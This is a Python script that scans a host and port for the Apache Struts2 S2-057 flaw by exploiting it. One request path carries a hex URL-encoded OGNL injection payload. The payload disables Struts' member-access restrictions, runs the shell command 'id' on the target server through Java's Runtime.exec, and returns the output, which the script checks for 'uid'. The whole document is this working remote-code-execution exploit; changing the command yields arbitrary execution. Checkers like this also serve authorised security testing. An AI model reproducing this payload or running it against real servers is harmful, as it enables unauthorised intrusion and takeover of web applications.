try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/showcase/%24%7b%0a%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%61%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%27%69%64%27%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%7d/actionChain1.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs :
                urls = 'http://' + url+":"+port+dir
                self.queues.put(urls)


    def Test(self):
        while not self.queues.empty():
    
            try:
                url  = self.queues.get(False)
                req = requests.get(url  ,timeout=3)
            #print req.text
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-057 in ' + self.ip)
                    os._exit(1)
            except:
                pass
        logging.info('[-] S2-057 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]

    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:

        test.Test()
    except:
        os._exit(3)
    

